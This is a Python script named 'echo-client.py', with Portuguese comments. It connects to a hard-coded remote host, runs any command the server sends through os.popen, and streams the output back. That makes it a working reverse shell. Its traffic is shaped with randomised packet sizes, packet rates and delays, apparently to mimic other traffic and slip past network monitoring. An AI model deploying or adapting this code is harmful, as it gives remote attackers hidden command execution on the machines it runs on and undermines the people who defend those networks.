# echo-client.py
# TIER 1: 2/3 at 19/20 caracteres (81 a 104/5 bytes)
# TIER 2: 21 at 31/32 caracteres (105/6 a120 bytes )...
# TIER 3: 32/33 at 54 caracteres (de 106/107 a150 bytes... ) ..

#TIER a: 2/3 a 8: 81 a 89 bytes... RANDOM MAIS OU MENOS 20%
#TIER b: 9 a 24: 90 a 110 bytes... BINOMIAL COMOM 50% 
#TIER c: 24 a 35: 110 a 125 bytes... EXP RARP 20%
#TIER d: 35 a 54: 125 a 150 bytes... EXP ULTRA RATO 10%

import base64
import socket
import numpy as np
import random
import time
import os

def gen_pktlen_binomial():
    n = 4096     # ~ 300k
    size = 15000 # ~ 300k
    prob = 0.15  # estes valores experimentei para ver se davam um grafico parecido...
    y = np.random.binomial(n, prob, size=500)           # gen binomial random distribution
    y = np.interp(y, (np.amin(y), np.amax(y)), (2, 50))  # scale to 2-50 characteres... #50
    #return y
    return [round(x) for x in y]                                        #

def gen_pktlen_normal():
    mu = 0
    sigma = 0.5
    n = 500
    y = np.random.normal(mu, sigma, n)
    #return [round(x) for x in y]
    y = np.interp(y, (np.amin(y), np.amax(y)), (2, 20))  # scale to 2-50 characteres...
    return [round(x) for x in y] 

def gen_negative_binomial():  #????
    maxv = 70
    minv = 2
    n = 7#8
    p = 0.50#0.35 
    r = np.random.negative_binomial(n, p, size=None)  #5555
    r = r % (maxv - minv + 1) + minv
    return r

def gen_beta_negative_binomial():
    minv = 1
    maxv = 60 
    a = 1.5; b = 1.7; n = 3;
    p = np.random.beta(a, b, size=None)
    r = np.random.negative_binomial(n, p)
    return r % (maxv - minv +1) + minv

def gen_pps():
    exp = 1+np.random.exponential(scale=1000, size=5000) # generate random exponential dist
    exp = np.interp(exp, (np.amin(exp), np.amax(exp)), (1, 150)) # scale to max 150pps
    exp = np.round(exp)  # float to int
    exp1 = exp[exp < 9] # for
    exp2 = exp[exp >=9] # more accentuated
    expx = [exp1, exp2]  # exp dist.
    idx = [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 1, 1] # weighted random pick 
    return int(random.choice(expx[idx[random.randint(0, 19)]])) #pick a pps


HOST = "111.11.11.10"      #111.11.11.10111.11.11.10111.11.11.10111.11.11.10111.11.11.10127.0.0.1127.0.0.1
PORT = 65321 # The port used by the server65321             65321             

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((HOST, PORT))
    s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
    
    while True:
        """ GET COMMAND """
        server_cmd = s.recv(2048).decode()

        print("entering popen with command: ", server_cmd)
        stream = os.popen(server_cmd+" 2>&1")
        outcmd = stream.read()
        print("exiting open")

        """ generate output data 2 send """
        send_output = []
        exit_while = False
        prev_chars2read = 0
        while not exit_while:
            pps = gen_pps()  ########################### PPS
            aux = []
            for i in range(0, pps):
                chars2read = np.random.choice(gen_pktlen_binomial()) #################### PKT LEN
                next_chars2read = prev_chars2read+chars2read
                print(next_chars2read)
                if next_chars2read < len(outcmd):
                    cmd2append = outcmd[prev_chars2read : next_chars2read]
                    if cmd2append != '':
                        aux.append(cmd2append)
                else:
                    cmd2append = outcmd[prev_chars2read : ]
                    if cmd2append != '':
                        aux.append(cmd2append)
                    exit_while = True
                prev_chars2read = next_chars2read
            send_output.append(aux) # =send_output =send_output
        send_output.append(["<C"+"TAIL>"])
        print("data output generated")

        print(send_output)

        """ SEND OUTPUT """
        for pps_group in send_output:
            for txt in pps_group:
                s.sendall(txt.encode())
                time.sleep(0.018)
            time.sleep(random.uniform(1.5, 10))
